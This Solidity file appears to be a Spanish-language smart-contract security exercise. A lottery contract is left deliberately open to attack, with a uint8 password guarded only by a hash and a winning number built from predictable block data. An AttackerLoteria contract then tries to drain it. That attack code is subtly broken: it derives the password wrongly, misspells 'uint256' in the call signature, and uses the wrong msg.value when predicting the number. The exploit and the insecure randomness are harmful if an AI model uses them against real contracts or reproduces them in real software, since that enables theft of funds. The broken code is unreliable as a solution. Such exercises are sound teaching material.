// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

/**
 * El contrato LoteriaConPassword permite que las personas participen en una lotería
 * Sin embargo, solo permite participar a aquellas personas que "conocen" el password
 *
 * Para poder participar, una persona provee tres elementos:
 * 1. El password
 * 2. Un número (preddicción) de un número entero (uint256)
 * 3. Una cantidad de 1500 o 1500 wei
 *
 * De acuerdo a los tests, el contrato LoteriaConPassword comienza con un balance de 1500 wei o 1500
 * El objetivo es drenar los fondos del contrato LoteriaConPassword
 *
 * Para ello se desarrollará el contrato AttackerLoteria
 * El contrato AttackerLoteria ejecutará el método attack()
 * Al hacerlo, participará en la lotería:
 * - apostando 1500 wei o 1500 (según el require de LoteriaConPassword)
 * - "adivinando" el número ganador
 * - "conociendo" el password
 *
 * La operación termina cuando el contrato AttackerLoteria gana la lotería
 *
 * Nota:
 * - No cambiar la firma del método attack()
 * - Asumir que cuando attack() es llamado, el contrato AttackerLoteria posee un balance de Ether
 *
 * ejecuar el test con:
 * npx hardhat test test/DesafioTesting_8.js
 */

contract LoteriaConPassword {
    constructor() payable {}

    uint256 public FACTOR =
        104312904618913870938864605146322161834075447075422067288548444976592725436353;

    function participarEnLoteria(
        uint8 password,
        uint256 _numeroGanador
    ) public payable {
        require(msg.value == 1500 wei, "Cantidad de apuesta incorrecta");
        require(
            uint256(keccak256(abi.encodePacked(password))) == FACTOR,
            "Hash del password incorrecto"
        );

        uint256 numRandom = uint256(
            keccak256(
                abi.encodePacked(
                    FACTOR,
                    msg.value,
                    tx.origin,
                    block.timestamp,
                    msg.sender
                )
            )
        );

        uint256 numeroGanador = numRandom % 10;

        if (numeroGanador == _numeroGanador) {
            payable(msg.sender).transfer(msg.value * 2);
        }
    }
}

contract ILoteriaConPassword {
    function participarEnLoteria(uint8 password, uint256 _numeroGanador) external virtual payable {}
    function FACTOR() external virtual view returns (uint256) {}
}



contract AttackerLoteria {
    event Log(string message, bool success);
    
    
    // Funcion para realizar el ataque y ganar la loteria
    function attack(address _sc) public payable {
        ILoteriaConPassword _LoteriaConPassword = ILoteriaConPassword(_sc);
     // Calcula FACTOR y _numRandom correctamente aquí antes de llamar a 'attack'
        uint8 _password = calcularPassword(_LoteriaConPassword.FACTOR());
        uint256 _numRandom = calcularNumRandom(_LoteriaConPassword) % 10;

        

        (bool success, ) = payable(_sc).call{
            value: 1500 // Esto representa 1500 wei
        }(abi.encodeWithSignature("participarEnLoteria(uint8,unit256)", _password, _numRandom));
        emit Log("Funciono: %s", success);
    } 
    
            
       
   
    // Funcion para generar un numero aleatorio
    function calcularNumRandom(ILoteriaConPassword loteriaConPassword) private view returns (uint256) {
        return uint256(
            keccak256(
                abi.encodePacked(
                    loteriaConPassword.FACTOR(), 
                    msg.value, 
                    tx.origin, 
                    block.timestamp, 
                    address(this)
                )
            )
        );
            
    }
    
    // Calcula el password correcto
    function calcularPassword(uint256 _factor) public pure returns (uint8) {    
        uint8 password = (uint8)(_factor & 0xff);
        return password;
    }

}

        